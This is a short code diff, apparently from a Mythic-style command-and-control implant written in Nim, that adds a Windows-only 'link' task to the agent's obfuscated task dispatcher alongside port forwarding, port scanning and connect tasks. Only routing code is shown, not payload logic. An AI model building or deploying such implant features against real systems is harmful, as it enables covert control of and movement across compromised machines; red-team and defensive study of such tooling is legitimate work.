@@ -32,6 +32,10 @@ import ../tasks/rpfwd
 import ../tasks/redirect
 import ../tasks/getenv as taskGetenv
 import ../tasks/connect
+
+when defined(windows):
+  import ../tasks/link
+
 import ../tasks/portscan
 import ../tasks/ifconfig
 import ../tasks/netstat
@@ -304,6 +308,14 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
       debug "[DEBUG] Executing connect command"
       result.response = handleConnect(taskId, params)
       # Connect requires background tracking in agent.nim
+      
+    of obf("link"):
+      when defined(windows):
+        debug "[DEBUG] Executing link command"
+        result.response = handleLink(taskId, params)
+        # Link requires background tracking in agent.nim
+      else:
+        result.response = mythicError(taskId, "Link command is only supported on Windows")
     
     of obf("redirect"):
       debug "[DEBUG] Executing redirect command"
